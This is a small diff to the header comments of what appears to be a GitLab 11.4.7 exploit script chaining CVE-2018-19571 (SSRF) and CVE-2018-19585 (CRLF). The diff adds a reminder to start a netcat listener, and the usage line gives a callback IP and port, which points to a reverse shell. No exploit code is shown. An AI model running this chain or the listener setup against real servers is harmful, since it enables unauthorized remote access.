@@ -6,6 +6,7 @@
 # Tested on: GitLab 11.4.7 CE
 # CVE : CVE-2018-19571 (SSRF),CVE-2018-19585 (CRLF)
 # USAGE: python3 test.py -U anakein -P 13371337 -l 10.10.14.130 -p 1337
+# Remember, enable listenning port (e.g.) # sudo nc -nlvp 1337
 # https://www.exploit-db.com/exploits/49263
 # Exploit Fix by @anakein, added proxy for use with burp and see process
 
